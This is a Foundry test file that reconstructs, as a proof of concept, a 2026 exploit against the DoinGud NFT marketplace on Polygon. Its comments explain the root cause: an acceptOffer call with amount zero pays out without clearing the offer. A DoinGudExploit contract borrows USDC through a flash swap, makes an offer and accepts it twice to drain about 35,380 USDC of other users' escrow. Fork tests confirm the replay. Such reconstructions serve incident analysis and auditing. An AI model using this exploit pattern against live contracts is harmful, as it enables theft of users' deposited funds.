// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// DoinGud marketplace - acceptOffer double-payout / escrow drain. Polygon, 2026-09.
//
// Attack tx : 0x56818a63077f5ba8bfc0bc0877ac33502a5d65cc79dbf5dfaac2a0b8545216a8
// Block     : 94170781 (fork at parent 94170780)
// Attacker  : EOA 0xb8C717239BCACE558c3a8Dc471c16E07bF57a1Eb, via its pre-deployed helper
//             contract 0xe588834AA3161a0720E8F6bf223748D6098a4B76 (the tx `to` is that
//             contract, a to-contract call, NOT a contract creation - confirmed from the trace).
//
// Contracts (Polygon, chainid 137):
//   DoinGud marketplace (EIP-2535 Diamond, holds the escrow) : 0xE3A161EdD679fC5ce2dB2316a4B6f7ab33a8eD6A
//   Marketplace facet (the vulnerable impl, delegatecalled)  : 0x123aAFC8D0a07CE1A146E53aA899e77f21A2DDe1
//   USDC (PoS)                                               : 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174
//   UniswapV2-style USDC/miMATIC pair (flash-swap source)    : 0x160532D2536175d65C03B97b0630A9802c274daD (token0 = USDC)
//
// NOTE ON SOURCE: the marketplace facet 0x123aAFC8... is NOT verified on Polygonscan (getsourcecode
// returns an empty ContractName / SourceCode). So the two entry points are called by their real
// on-chain selectors, with real typed arguments decoded from the trace, rather than through a named
// verified ABI:
//   makeOffer   selector 0xf6dbe82d   args (address offerer, uint256 tokenId, uint256 price, 6x uint256=0)
//   acceptOffer selector 0x5c924960   args (address offerer, uint256 tokenId, uint256 price, uint256 amount)
// The names are inferred from behaviour (below); the selectors and the argument layout are taken
// verbatim from the decoded internal calls in the attack trace. This is a structural reconstruction
// from typed values, not a raw-calldata blob.
//
// ROOT CAUSE (the facet is unverified, so this is confirmed EMPIRICALLY against live fork state and
// the disassembled dispatcher, not read from source):
//   acceptOffer(offerer, tokenId, price, amount) transfers `price` USDC out of the marketplace escrow
//   to msg.sender when amount == 0, and does NOT delete / zero the offer record afterwards. So the
//   exact same offer can be accepted again with byte-identical calldata and pays out `price` every
//   time. There is also no `offerer != msg.sender` check (attacker is both maker and acceptor).
//
//   Two independent checks establish this against real fork state (testAmountZeroIsTheReplayBug and
//   testAmountNonzeroReverts below, and the trace testExploit prints):
//     * amount == 0: acceptOffer succeeds and is REPLAYABLE - a second byte-identical call pays
//       `price` again. There is no state-clearing call, token burn or offer deletion between or
//       after the two accepts; the second behaves exactly like the first. This is the drain.
//     * amount  > 0: acceptOffer REVERTS (the normal path - which would move the NFT quantity and
//       retire the offer - cannot complete for a self-offer holding no NFT). So amount == 0 is
//       exactly what routes around the offer-consuming/cleanup branch while still paying `price`,
//       matching the alert's "amount=0 defeats _updateListingAfterTransfer's `0 > 0` cleanup check".
//   The double payout is therefore the missing cleanup on the amount==0 path, not some other setup.
//
// FLOW OF FUNDS (the escrow already held ~35,486.9 USDC of OTHER users' funds at the fork block;
//   balanceOf(escrow) == 35_486_935717 before the attack even starts):
//   1. flash-swap-borrow  35,486.935717 USDC from the UniV2 pair.
//   2. makeOffer          -> escrow pulls the borrowed 35,486.935717 USDC in (offer id 1 funded).
//   3. acceptOffer  #1    -> escrow pays 35,486.935717 USDC back out to the attacker.
//   4. acceptOffer  #2    -> escrow pays 35,486.935717 USDC AGAIN (this leg is drained from the
//                            pre-existing other-user escrow balance - the actual theft).
//   5. repay flash swap   35,593.716868 USDC (borrow + 0.3% fee) back to the pair.
//   Net = 2*price - repay = 70,973.871434 - 35,593.716868 = ~35,380.15 USDC, funded entirely by the
//   flash loan with zero NFT or principal put up by the attacker. Matches the reported ~35,380 USDC.
//
// This PoC is a from-scratch reconstruction: a named DoinGudExploit contract takes a real UniswapV2
// flash swap and makes real typed calls into the live deployed marketplace. No bytecode blob, no raw
// calldata replay, no settled-state shortcut.

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract DoinGudExploit {
    IERC20 constant USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IUniswapV2Pair constant PAIR = IUniswapV2Pair(0x160532D2536175d65C03B97b0630A9802c274daD);
    address constant MARKETPLACE = 0xE3A161EdD679fC5ce2dB2316a4B6f7ab33a8eD6A;

    bytes4 constant MAKE_OFFER_SEL = 0xf6dbe82d;
    bytes4 constant ACCEPT_OFFER_SEL = 0x5c924960;

    uint256 constant TOKEN_ID = 1;
    uint256 constant PRICE = 35_486_935_717; // 35,486.935717 USDC, exactly as on-chain

    function run() external {
        // Flash-swap-borrow PRICE of USDC (token0) from the pair; non-empty data triggers the
        // uniswapV2Call flash callback where the whole attack executes.
        PAIR.swap(PRICE, 0, address(this), abi.encode(PRICE));
        // After the flash swap settles, sweep profit to the attacker (the test contract).
        USDC.transfer(msg.sender, USDC.balanceOf(address(this)));
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        require(msg.sender == address(PAIR), "bad caller");
        uint256 borrowed = amount0; // == PRICE, USDC

        // The marketplace pulls the offer price from us on makeOffer; approve it.
        USDC.approve(MARKETPLACE, type(uint256).max);

        // 1) Create + fund offer id 1 (real typed call, selector 0xf6dbe82d). This transfers the
        //    borrowed PRICE USDC into the marketplace escrow.
        // 9 argument words total (offerer, tokenId, price, then 6 trailing zero words), exactly as
        // in the trace. The facet's ABI decoder requires the arg region to be >= 0x120 (288) bytes;
        // one word short reverts empty at ~286 gas before any storage read.
        (bool ok,) = MARKETPLACE.call(
            abi.encodeWithSelector(
                MAKE_OFFER_SEL,
                address(this),
                TOKEN_ID,
                PRICE,
                uint256(0),
                uint256(0),
                uint256(0),
                uint256(0),
                uint256(0),
                uint256(0)
            )
        );
        require(ok, "makeOffer failed");

        // 2) Accept the offer with amount == 0. Pays PRICE back out to us and, because of the missing
        //    cleanup + amount==0 guard-skip, leaves the offer record intact.
        _acceptOffer();

        // 3) Accept the SAME offer again with byte-identical calldata. Pays PRICE a second time -
        //    this leg drains the pre-existing escrow (other users' funds).
        _acceptOffer();

        // Repay the flash swap: borrowed + 0.3% fee, rounded up (UniswapV2). == 35,593,716,868.
        uint256 repay = (borrowed * 1000) / 997 + 1;
        USDC.transfer(address(PAIR), repay);
    }

    function _acceptOffer() internal {
        (bool ok,) = MARKETPLACE.call(
            abi.encodeWithSelector(ACCEPT_OFFER_SEL, address(this), TOKEN_ID, PRICE, uint256(0))
        );
        require(ok, "acceptOffer failed");
    }
}

contract DoinGudExploitTest is BaseTestWithBalanceLog {
    address constant USDC = 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174;
    address constant MARKETPLACE = 0xE3A161EdD679fC5ce2dB2316a4B6f7ab33a8eD6A;

    function setUp() public {
        vm.createSelectFork("polygon", 94_170_780); // parent of the exploit block
        fundingToken = USDC;
    }

    function testExploit() public balanceLog {
        // Sanity: the escrow already holds another user's ~35,486.9 USDC at the fork block. The
        // second acceptOffer is drained from this pre-existing balance, which is the real theft.
        uint256 escrowBefore = IERC20(USDC).balanceOf(MARKETPLACE);
        assertEq(escrowBefore, 35_486_935_717, "unexpected pre-existing escrow balance");

        DoinGudExploit exploit = new DoinGudExploit();
        exploit.run();

        uint256 profit = IERC20(USDC).balanceOf(address(this));
        emit log_named_decimal_uint("USDC profit", profit, 6);

        // Reported net profit ~35,380 USDC. Assert we reproduced it within a small band.
        assertApproxEqAbs(profit, 35_380_154_566, 1_000_000, "profit did not reproduce ~35,380 USDC");
    }

    // The offer record is never cleared on the amount==0 path: after one makeOffer, the SAME offer
    // can be accepted twice with byte-identical calldata, each paying `price`. This is the drain.
    function testAmountZeroIsTheReplayBug() public {
        deal(USDC, address(this), 35_486_935_717);
        IERC20(USDC).approve(MARKETPLACE, type(uint256).max);
        (bool m,) = MARKETPLACE.call(
            abi.encodeWithSelector(
                bytes4(0xf6dbe82d), address(this), uint256(1), uint256(35_486_935_717),
                uint256(0), uint256(0), uint256(0), uint256(0), uint256(0), uint256(0)
            )
        );
        require(m, "makeOffer");
        (bool a1,) = MARKETPLACE.call(abi.encodeWithSelector(bytes4(0x5c924960), address(this), uint256(1), uint256(35_486_935_717), uint256(0)));
        (bool a2,) = MARKETPLACE.call(abi.encodeWithSelector(bytes4(0x5c924960), address(this), uint256(1), uint256(35_486_935_717), uint256(0)));
        assertTrue(a1, "first amount==0 accept should pay out");
        assertTrue(a2, "offer was not cleared: second identical accept must also pay out");
    }

    // A nonzero amount takes the normal (offer-consuming) path, which cannot complete for a
    // self-offer holding no NFT, so it reverts. Confirms amount==0 is what routes around cleanup.
    function testAmountNonzeroReverts() public {
        deal(USDC, address(this), 35_486_935_717);
        IERC20(USDC).approve(MARKETPLACE, type(uint256).max);
        (bool m,) = MARKETPLACE.call(
            abi.encodeWithSelector(
                bytes4(0xf6dbe82d), address(this), uint256(1), uint256(35_486_935_717),
                uint256(0), uint256(0), uint256(0), uint256(0), uint256(0), uint256(0)
            )
        );
        require(m, "makeOffer");
        (bool a1,) = MARKETPLACE.call(abi.encodeWithSelector(bytes4(0x5c924960), address(this), uint256(1), uint256(35_486_935_717), uint256(1)));
        assertFalse(a1, "nonzero amount should not take the free-payout path");
    }
}
